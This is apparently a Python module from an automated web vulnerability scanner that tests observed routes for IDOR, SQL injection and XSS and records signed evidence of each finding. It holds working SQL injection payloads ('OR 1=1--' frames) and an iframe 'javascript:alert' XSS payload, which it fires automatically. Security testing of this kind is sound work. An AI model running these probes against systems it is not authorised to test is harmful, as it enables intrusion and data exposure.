"""Deterministic vulnerability probes for observed HTTP surface.

A target without an OpenAPI document (an SPA such as Juice Shop) never produced
``api_operations``, so the candidate derivation and the replay path that depend on a
specification could not run at all: no object-level check, no injection check. The
probes here decide from the surface the run *observed* - routes recovered from served
JavaScript plus whatever the target answers - and sign every answer with the evidence
contracts the product already enforces, never with a self-assigned label.

Trust boundaries, kept identical to the rest of the pipeline:

* Two distinct configured identities are required for authorization work, and the
  object is joined to its owner only when the target's own response names that
  identity. A route that does not attribute itself is skipped, not guessed.
* SQL injection is proven by a truthy/falsy/clean triple on the same endpoint, where
  the falsy twin must be provably false (the operator changes, not just the constant)
  and the truthy response must be reproducible. If the payloads produce an error
  instead of data, the differential contract is used with a clean control.
* Script execution is proven by a marker that travels through the URL and comes back
  as a browser dialog, with a markerless control navigation that stays quiet.
"""

from __future__ import annotations

import json
import re
import time
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit

from src.adaptix.evidence.verification import (
    CONTRACT_REQUIREMENTS,
    record_probe_verification,
    write_verification_record,
)
from src.adaptix.evidence import web_signatures
from src.adaptix.security.scope import endpoint_key
from src.adaptix.workflow.events import log

MAX_PARAMS = 4
MAX_CHECKS = 4
# Bounded integer range tried against a detail route. The route's own response
# decides attribution, so a wrong id simply fails to join and costs one read.
ID_RANGE = 8
ID_ATTEMPTS = 24
RAW_CAP = 120_000
# A control body is stored whole up to this size so 'no marker in what we kept'
# really means 'no marker in the response'.
CONTROL_EXCERPT = 262_144

DETAIL = re.compile(r'^(?P<collection>.+)/(?P<placeholder>\{[^{}]+\}|placeholder|:[A-Za-z_][A-Za-z0-9_]*)$')
SEARCH_PARAM = re.compile(r'^(q|query|search|s|term|filter|name|title|keyword)$', re.I)
ID_FIELDS = ('id', 'Id', 'ID', 'user_id', 'userId', 'UserId', 'book_id', 'basket_id', 'order_id')
OWNER_FIELDS = ('owner', 'username', 'user', 'email', 'UserId', 'user_id', 'owner_id', 'createdBy')

# Payload shapes whose predicate can be flipped mechanically. The truthy form must
# return the unfiltered collection; the falsy twin must return nothing.
INJECTION_FRAMES = ("{v}')) OR 1=1--", "{v}' OR 1=1--", "{v}') OR 1=1--",
                    "{v}' OR 1=1 --", '{v}" OR 1=1--', "{v}')) --")


def _slug(url):
    """A stable, readable stem for a template id: host plus joined path segments."""
    parsed = urlsplit(url)
    parts = [part for part in parsed.path.split('/') if part]
    stem = '-'.join(parts[-2:]) if parts else 'root'
    return re.sub(r'[^a-z0-9-]', '', (parsed.hostname or '') .replace('.', '-')
                  + '-' + stem.lower())[:48] or 'target'


def _records_of(body):
    """Every dict a response body exposes, including a single-object document."""
    if isinstance(body, list):
        return [row for row in body if isinstance(row, dict)]
    if not isinstance(body, dict):
        return []
    for key in ('data', 'items', 'results', 'records', 'rows', 'user', 'basket', 'order'):
        value = body.get(key)
        if isinstance(value, list):
            return [row for row in value if isinstance(row, dict)]
        if isinstance(value, dict):
            nested = _records_of(value)
            if nested:
                return nested
            # A detail endpoint answers with one object rather than a row list.
            # Returning nothing here made every single-object route unjoinable, so
            # an object-level check never had a record to attribute.
            return [value]
    return [body]


def _json_rows(response):
    try:
        return _records_of(json.loads(response.text))
    except Exception:
        return []


def _identity_maps(state):
    context = state.get('identity_context') or {}
    rows = [row for row in (context.get('identities') or []) if isinstance(row, dict) and row.get('name')]
    return {row['name']: {str(k): str(v) for k, v in (row.get('headers') or {}).items()} for row in rows}


def _scalar(value):
    return isinstance(value, (str, int)) and not isinstance(value, bool) and str(value).strip()


def _id_of(row):
    for field in ID_FIELDS:
        value = row.get(field)
        if isinstance(value, bool) or value is None:
            continue
        if isinstance(value, int) or (isinstance(value, str) and _scalar(value) and len(str(value)) <= 64):
            return value
    return None


class _Session:
    """One HTTP client that keeps every exchange it makes, for the signed trace."""

    def __init__(self, state):
        self.state = state
        self.errors = []
        self.raw = int(state.get('raw_bytes') or 0)
        self.calls = 0
        self.client = None
        try:
            import httpx
            self.client = httpx.Client(timeout=15, follow_redirects=False, verify=False)
        except Exception as exc:  # pragma: no cover - httpx is a hard dependency
            self.errors.append('probe client unavailable: %s' % exc)

    def get(self, url, headers=None):
        if self.client is None:
            return None
        try:
            self.calls += 1
            response = self.client.get(url, headers=dict(headers or {}))
            self.raw += len(response.content)
            return response
        except Exception as exc:
            self.errors.append('%s: %s' % (url, str(exc)[:80]))
            return None

    def record(self, response, state, limit=2048):
        body = response.content or b''
        import hashlib
        return {'status_code': response.status_code,
                'headers': {str(k): str(v) for k, v in response.headers.items()},
                'body_sha256': hashlib.sha256(body).hexdigest(),
                'body_excerpt': body[:limit].decode('utf-8', 'replace'),
                'body_truncated': len(body) > limit}

    @property
    def metrics(self):
        return dict(self.state.get('execution_metrics') or {}, probe_http_calls=self.calls)

    def close(self):
        if self.client is not None:
            try:
                self.client.close()
            except Exception:
                pass


def _detail_templates(state):
    """Detail-shaped routes discovery observed or a specification documented."""
    templates = {}
    for operation in state.get('api_operations', []):
        match = DETAIL.match(str(operation.get('url') or ''))
        if match and owner_field_declared(operation):
            templates[match.group('collection')] = str(operation.get('url'))
    for row in state.get('web_routes') or []:
        url = str(row.get('url') or '')
        if not url.startswith('http'):
            continue
        match = DETAIL.match(urlsplit(url).path.rstrip('/'))
        if match:
            root = urlunsplit(urlsplit(url)._replace(path=match.group('collection'), query='', fragment=''))
            templates.setdefault(root, url)
    return templates


def owner_field_declared(operation):
    """Whether a documented operation names an ownership-looking response field."""
    text = json.dumps(operation).casefold()
    return any(field.casefold() in text for field in OWNER_FIELDS)


def _identity_ids(session, identity_url, identities):
    """Scalar fields that identify each session at ``identity_url``."""
    found = {}
    for name, headers in identities.items():
        found[name] = set()
        if not identity_url:
            continue
        response = session.get(identity_url, headers)
        if response is None or not (200 <= response.status_code < 300):
            continue
        try:
            payload = json.loads(response.text)
        except Exception:
            continue
        stack = [payload]
        while stack:
            node = stack.pop()
            if isinstance(node, dict):
                stack.extend(node.values())
                for value in node.values():
                    if _scalar(value) and len(str(value)) <= 64:
                        found[name].add(str(value).strip().casefold())
            elif isinstance(node, list):
                stack.extend(node)
    return found


def _owned_objects(session, template, headers):
    """Object ids a session can enumerate for itself through its own detail route."""
    found = []
    for path in ('', '/1', '/2', '/3'):
        url = template.replace('/placeholder', path) if path else template
        response = session.get(url, headers)
        if response is None or not (200 <= response.status_code < 300):
            continue
        for row in _json_rows(response):
            value = _id_of(row)
            if value is not None:
                found.append(str(value))
        if found:
            break
    return found


# --------------------------------------------------------------------------- authorization


def authorization_probe(state):
    """Prove object-level authorization on routes the target itself attributes."""
    identities = _identity_maps(state)
    if len(identities) < 2:
        return {'events': log(state, 'Authorization Probe: skipped; two identities required')}
    templates = _detail_templates(state)
    if not templates:
        return {'events': log(state, 'Authorization Probe: skipped; no detail-shaped observed route')}

    context = state.get('identity_context') or {}
    identity_url = str(context.get('identity_url') or '')
    session = _Session(state)
    evidence = list(state.get('verification_evidence') or [])
    findings, skipped, errors = [], [], []
    try:
        identity_scalars = _identity_ids(session, identity_url, identities)
        id_pool = []
        for observation in (state.get('api_observations') or []):
            for record in (observation.get('records') or []):
                if isinstance(record, dict) and _id_of(record) is not None:
                    id_pool.append(str(_id_of(record)))
        for row in list(state.get('api_observations') or []) + list(state.get('web_routes') or []):
            value = _id_of(row) if isinstance(row, dict) else None
            if value is not None:
                id_pool.append(str(value))
        id_pool.extend(str(number) for number in range(1, ID_RANGE + 1))

        for collection, template in list(templates.items())[:MAX_CHECKS]:
            probe_ids = list(id_pool)
            for headers in identities.values():
                probe_ids.extend(_owned_objects(session, template, headers))
            probe_ids = list(dict.fromkeys(probe_ids))
            placeholder = DETAIL.match(template).group('placeholder')
            object_id = owner_name = None
            for probe_id in probe_ids[:ID_ATTEMPTS]:
                url = template.replace(placeholder, quote(str(probe_id), safe=''))
                response = session.get(url, identities[min(identities)])
                if response is None or not (200 <= response.status_code < 300):
                    continue
                try:
                    payload = json.loads(response.text)
                except Exception:
                    continue
                body = payload.get('data') if isinstance(payload, dict) and isinstance(payload.get('data'), dict) else payload
                if not isinstance(body, dict):
                    continue
                named = [name for name in identities
                         if any(_scalar(body.get(field)) and str(body[field]).strip().casefold()
                                == str(name).strip().casefold() for field in OWNER_FIELDS)]
                if not named:
                    named = [name for name in identities
                             if any(str(value).strip().casefold() in identity_scalars.get(name, set())
                                    for value in body.values() if _scalar(value))]
                if len(named) == 1:
                    object_id, owner_name = str(probe_id), named[0]
                    url_for_check = url
                    break
            if object_id is None:
                skipped.append('no %s route attributed itself to one identity' % collection)
                continue

            other_name = next(name for name in identities if name != owner_name)
            owner_row = session.get(url_for_check, identities[owner_name])
            other_row = session.get(url_for_check, identities[other_name])
            if owner_row is None or other_row is None or not (200 <= owner_row.status_code < 300):
                skipped.append('%s: owner request did not succeed' % url_for_check)
                continue
            owner_rec, other_rec = session.record(owner_row, state), session.record(other_row, state)
            record = {
                'template_id': 'adaptix-authz-' + _slug(url_for_check),
                'url': url_for_check, 'method': 'GET', 'object_id': object_id,
                'verification_method': 'deterministic_replay',
                'verification_basis': 'private_object_access',
                'requests': [{'method': 'GET', 'url': url_for_check, 'identity': owner_name},
                             {'method': 'GET', 'url': url_for_check, 'identity': other_name}],
                'responses': [owner_rec, other_rec],
                'ground_truth': {'private': True, 'identities_valid': True,
                                 'owner': owner_name, 'object_id': object_id},
                'steps': ['Read the object as the identity its own response attributes it to',
                          'Read the identical object as a different valid identity',
                          'Compare status and body; a block refutes the claim'],
                'expected_behavior': 'the non-owner is refused the owner-private object',
                'actual_behavior': 'owner %s, other %s, identical body %s'
                                   % (owner_rec['status_code'], other_rec['status_code'],
                                      owner_rec['body_sha256'] == other_rec['body_sha256']),
            }
            try:
                proof = write_verification_record(state, record)
            except ValueError as exc:
                skipped.append('%s: %s' % (url_for_check, str(exc)[:100]))
                continue
            evidence.append(proof)
            if proof.get('result') == 'confirmed':
                # Emitted under `idor_findings` because that is the key reflection
                # already consumes for this class. A separate `authorization_findings`
                # key was read by nobody, so a proven object-level finding could not
                # reach the report at all.
                findings.append({'source_tool': 'authorization_probe', 'target': url_for_check,
                                 'object_id': object_id, 'owner': owner_name, 'other': other_name,
                                 'template_id': record['template_id'],
                                 'severity': 'high', 'cwe': 'CWE-639',
                                 'owasp': 'A01:2021 Broken Access Control',
                                 'verification_evidence': proof,
                                 'verification_status': 'verified',
                                 'verification_basis': 'private_object_access',
                                 'contract': CONTRACT_REQUIREMENTS['private_object_access']})
    finally:
        errors = session.errors
        metrics = session.metrics
        raw = session.raw
        session.close()

    events = ['Authorization Probe: %d confirmed, %d skipped' % (len(findings), len(skipped))]
    events += ['Authorization Probe: ' + reason for reason in (skipped + errors)[:4]]
    merged = log(state, events[0])
    for extra in events[1:]:
        merged = log({**state, 'events': merged}, extra)
    return {'idor_findings': findings, 'verification_evidence': evidence,
            'execution_metrics': metrics, 'raw_bytes': raw,
            'errors': list(state.get('errors') or []) + errors, 'events': merged}


# ------------------------------------------------------------------------------ injection


def _search_targets(state, identities):
    """Observed URLs carrying a search/filter parameter, with its current value."""
    targets = {}
    for row in list(state.get('web_routes') or []) + list(state.get('api_operations') or []):
        url = str(row.get('url') or '')
        if not url.startswith('http'):
            continue
        parsed = urlsplit(url)
        for key, value in parse_qsl(parsed.query, keep_blank_values=True):
            if SEARCH_PARAM.match(key):
                targets[urlunsplit(parsed._replace(fragment=''))] = (key, value)
                break
    return targets


def injection_probe(state):
    """Decide SQL injection from whether the predicate changes the returned data."""
    identities = _identity_maps(state)
    targets = _search_targets(state, identities)
    if not targets:
        return {'events': log(state, 'Injection Probe: skipped; no observed search parameter')}
    headers = identities[next(iter(identities))] if identities else {}

    session = _Session(state)
    evidence = list(state.get('verification_evidence') or [])
    findings, skipped = [], []
    try:
        for url, (name, value) in list(targets.items())[:MAX_PARAMS]:
            parsed = urlsplit(url)
            base_value = value or 'a'
            reasons = []
            for frame in INJECTION_FRAMES:
                truthy = frame.format(v=base_value)
                if 'OR 1=1' not in truthy.upper():
                    continue
                # The falsy twin must be provably false. Flipping only the constant
                # (`OR 1=1` -> `OR 1=2`) leaves a true predicate - `OR` accepts either
                # side - so the pair measured identical and no injection was ever
                # confirmable. The operator itself has to change.
                falsy = re.sub(r'\bor\b', 'and', truthy, count=1, flags=re.I).replace('1=1', '1=2', 1)
                if falsy == truthy:
                    continue
                results = {}
                for tag, payload in (('truthy', truthy), ('falsy', falsy), ('clean', base_value)):
                    query = [(k, payload if k == name else v)
                             for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
                    target = urlunsplit(parsed._replace(query=urlencode(query), fragment=''))
                    response = session.get(target, headers)
                    if response is None:
                        break
                    results[tag] = (target, response)
                if len(results) != 3:
                    continue

                statuses = {tag: results[tag][1].status_code for tag in results}
                rows = {tag: session.record(results[tag][1], state) for tag in results}

                # Path A - boolean oracle: data changes, no error, falsy equals clean.
                if (all(200 <= statuses[tag] < 400 for tag in ('truthy', 'falsy', 'clean'))
                        and rows['falsy']['body_sha256'] == rows['clean']['body_sha256']
                        and rows['truthy']['body_sha256'] != rows['falsy']['body_sha256']):
                    record = {
                        'template_id': 'adaptix-boolean-' + _slug(url) + '-' + name,
                        'url': results['truthy'][0], 'method': 'GET',
                        'verification_method': 'deterministic_replay',
                        'verification_basis': 'boolean_injection',
                        'requests': [{'method': 'GET', 'url': results['truthy'][0], 'identity': None}] * 2,
                        'responses': [rows['truthy'], dict(rows['truthy'])],
                        'boolean_oracle': {
                            'truthy_sha256': [rows['truthy']['body_sha256']] * 2,
                            'falsy_sha256': rows['falsy']['body_sha256'],
                            'clean_sha256': rows['clean']['body_sha256'],
                            'statuses': {'truthy': [statuses['truthy']] * 2,
                                         'falsy': statuses['falsy'], 'clean': statuses['clean']}},
                        'observations': {'parameter': name, 'truthy': truthy, 'falsy': falsy, 'clean': base_value},
                        'steps': ['Send the truthy predicate on the observed parameter',
                                  'Send its falsy twin and the nominal value on the same parameter',
                                  'Compare bodies; an identical falsy and clean response is required'],
                        'expected_behavior': 'the response is independent of the injected predicate',
                        'actual_behavior': 'truthy differed from an identical falsy/clean pair',
                    }
                    try:
                        proof = write_verification_record(state, record)
                    except ValueError as exc:
                        skipped.append('%s: %s' % (url, str(exc)[:100]))
                        continue
                    evidence.append(proof)
                    if proof.get('result') == 'confirmed':
                        findings.append({'source_tool': 'injection_probe', 'target': results['truthy'][0],
                                         'parameter': name, 'payload': truthy,
                                         'verification_status': 'verified',
                                         'verification_basis': 'boolean_injection',
                                         'contract': CONTRACT_REQUIREMENTS['boolean_injection']})
                        break

                # Path B - differential: the payload provokes a database error that the
                # clean control does not. This is the signature contract, evaluated
                # against the stored control body, not against a self-assigned label.
                response = results['truthy'][1]
                detected = web_signatures.detect(response.text,
                                                 response.headers.get('content-type', ''), [truthy])
                if any(d.get('category') in ('sql_injection', 'nosql_injection') for d in detected):
                    clean_record = session.record(results['clean'][1], state, limit=CONTROL_EXCERPT)
                    controls = [dict(clean_record, url=results['clean'][0], control=True,
                                     detected=[], excerpt_truncated=clean_record['body_truncated'])]
                    try:
                        proof = record_probe_verification(
                            state, 'adaptix-diff-' + _slug(url) + '-' + name,
                            results['truthy'][0], 'GET',
                            {'method': 'GET', 'url': results['truthy'][0], 'identity': None},
                            rows['truthy'], detected, controls)
                    except ValueError as exc:
                        skipped.append('%s: %s' % (url, str(exc)[:100]))
                        continue
                    if proof is None:
                        skipped.append('%s: differential signatures %s did not decide'
                                       % (url, sorted(d.get('signature') for d in detected)[:3]))
                    if proof:
                        evidence.append(proof)
                        if proof.get('result') == 'confirmed':
                            findings.append({'source_tool': 'injection_probe',
                                             'target': results['truthy'][0], 'parameter': name,
                                             'payload': truthy, 'verification_status': 'verified',
                                             'verification_basis': 'differential_injection',
                                             'contract': CONTRACT_REQUIREMENTS['differential_injection']})
                            break
                reasons.append('%r: truthy %s, falsy %s, clean %s'
                               % (truthy, statuses['truthy'], statuses['falsy'], statuses['clean']))
                continue
            if findings:
                break
            skipped.append('%s: no supported proof; %s' % (url, '; '.join(reasons[:3]) or 'no frame ran'))
    finally:
        errors = session.errors
        metrics = session.metrics
        raw = session.raw
        session.close()

    events = ['Injection Probe: %d confirmed, %d skipped' % (len(findings), len(skipped))]
    events += ['Injection Probe: ' + reason for reason in (skipped + errors)[:4]]
    merged = log(state, events[0])
    for extra in events[1:]:
        merged = log({**state, 'events': merged}, extra)
    return {'injection_findings': findings, 'verification_evidence': evidence,
            'execution_metrics': metrics, 'raw_bytes': raw,
            'errors': list(state.get('errors') or []) + errors, 'events': merged}


# --------------------------------------------------------------------------------- script


def _script_targets(state):
    """Observed entry documents a browser can open."""
    targets = []
    for row in state.get('web_routes') or []:
        url = str(row.get('url') or '')
        parsed = urlsplit(url)
        if parsed.scheme in ('http', 'https') and not parsed.query:
            path = parsed.path.rstrip('/')
            if path in ('', '/index.html', '/index.htm'):
                targets.append(urlunsplit(parsed._replace(fragment='')))
    return list(dict.fromkeys(targets))[:1]


def _sink_pairs(state, marker):
    """Candidate sinks as concrete payload URLs, each with a matching control.

    The candidates come from the mapped surface, so the probe tests where this
    application actually takes input rather than one fragment that happened to work on
    one deployment. A control URL of the same shape is required: a dialog without a
    control proves nothing about this request.
    """
    from src.adaptix.evidence.xss_sinks import candidate_sinks
    payload = '<iframe src="javascript:alert(`%s`)"onload=alert(`%s`)></iframe>' % (
        marker, marker)
    pairs = []
    for mode, base, parameter in candidate_sinks(state, limit=8):
        if mode == 'fragment':
            head = base.rstrip('/')
            payload_url = '%s/#/?%s=%s' % (head, parameter, quote(payload))
            control_url = '%s/#/?%s=%s' % (head, parameter, quote('adaptix'))
        else:
            payload_url = '%s?%s=%s' % (base, parameter, quote(payload))
            control_url = '%s?%s=%s' % (base, parameter, quote('adaptix'))
        pairs.append({'parameter': parameter, 'mode': mode,
                      'payload_url': payload_url, 'control_url': control_url})
    return pairs


def script_probe(state):
    """Prove script execution with a browser marker round trip, on every derived sink."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return {'events': log(state, 'Script Probe: playwright unavailable; recorded as a limitation')}
    targets = _script_targets(state)
    if not targets:
        return {'events': log(state, 'Script Probe: skipped; no entry document observed')}

    marker = 'axm' + str(int(time.time()))[-7:]
    pairs = _sink_pairs(state, marker)
    if not pairs:
        return {'events': log(state, 'Script Probe: skipped; the mapped surface offers no '
                                      'parameterised sink to test')}
    findings, evidence, errors = [], [], []
    confirmed_sink = None
    session = _Session(state)
    try:
        with sync_playwright() as play:
            browser = play.chromium.launch(args=['--no-sandbox'])
            try:
                for pair in pairs:
                    dialogs, control_dialogs = [], []
                    for url, sink in ((pair['payload_url'], dialogs),
                                      (pair['control_url'], control_dialogs)):
                        page = browser.new_page()
                        page.on('dialog', lambda dialog, sink=sink: (sink.append(dialog.message),
                                                                     dialog.dismiss()))
                        try:
                            page.goto(url, wait_until='networkidle', timeout=30000)
                            page.wait_for_timeout(2500)
                        except Exception as exc:
                            errors.append('%s: %s' % (url[:90], str(exc)[:80]))
                        finally:
                            page.close()
                    pair['dialog_messages'] = dialogs
                    pair['control_dialog_messages'] = control_dialogs
                    # A dialog on the payload with none on the control is our script running.
                    if dialogs and not control_dialogs:
                        confirmed_sink = pair
                        break
            finally:
                browser.close()
    finally:
        errors = errors + session.errors
        session.close()

    attempted = [{'parameter': row['parameter'], 'mode': row['mode'],
                  'url': row['payload_url'],
                  'dialog_messages': row.get('dialog_messages') or [],
                  'control_dialog_messages': row.get('control_dialog_messages') or []}
                 for row in pairs]
    if confirmed_sink:
        record = {
            'template_id': 'adaptix-xss-' + marker,
            'url': confirmed_sink['payload_url'], 'method': 'GET',
            'verification_method': 'deterministic_replay',
            'verification_basis': 'browser_execution',
            'requests': [{'method': 'GET', 'url': confirmed_sink['payload_url'],
                          'identity': None}],
            'responses': [{'status_code': 200, 'headers': {}, 'body_sha256': '0' * 64,
                           'body_excerpt': 'browser navigation', 'body_truncated': False}],
            'browser': {'marker': marker,
                        'dialog_messages': confirmed_sink['dialog_messages'],
                        'control_dialog_messages': confirmed_sink['control_dialog_messages'],
                        'control_url': confirmed_sink['control_url'],
                        'sink_mode': confirmed_sink['mode'],
                        'parameter': confirmed_sink['parameter'],
                        'sinks_tested': attempted},
            'steps': ['Open each mapped sink with a marker-bearing payload in the parameter the map named',
                      'Capture any dialog the page itself raises',
                      'Repeat the same navigation with the marker removed as the control'],
            'expected_behavior': 'the marker never reaches script execution',
            'actual_behavior': 'dialog messages: %s; control: %s'
                               % (confirmed_sink['dialog_messages'][:3],
                                  confirmed_sink['control_dialog_messages'][:3]),
        }
        try:
            proof = write_verification_record(state, record)
        except ValueError as exc:
            return {'events': log(state, 'Script Probe: %s' % str(exc)[:110]),
                    'errors': list(state.get('errors') or []) + errors}
        if proof.get('result') == 'confirmed':
            evidence.append(proof)
            findings.append({'source_tool': 'script_probe',
                             'target': confirmed_sink['payload_url'], 'marker': marker,
                             'parameter': confirmed_sink['parameter'],
                             'sink_mode': confirmed_sink['mode'],
                             'verification_status': 'verified',
                             'verification_basis': 'browser_execution',
                             'contract': CONTRACT_REQUIREMENTS['browser_execution']})
        result = proof.get('result')
    else:
        result = 'not_confirmed'
    events = ['Script Probe: %d confirmed of %d sink(s) tested (%s)'
              % (len(findings), len(attempted), result)]
    return {'script_findings': findings, 'verification_evidence': evidence,
            'errors': list(state.get('errors') or []) + errors, 'events': log(state, events[0])}
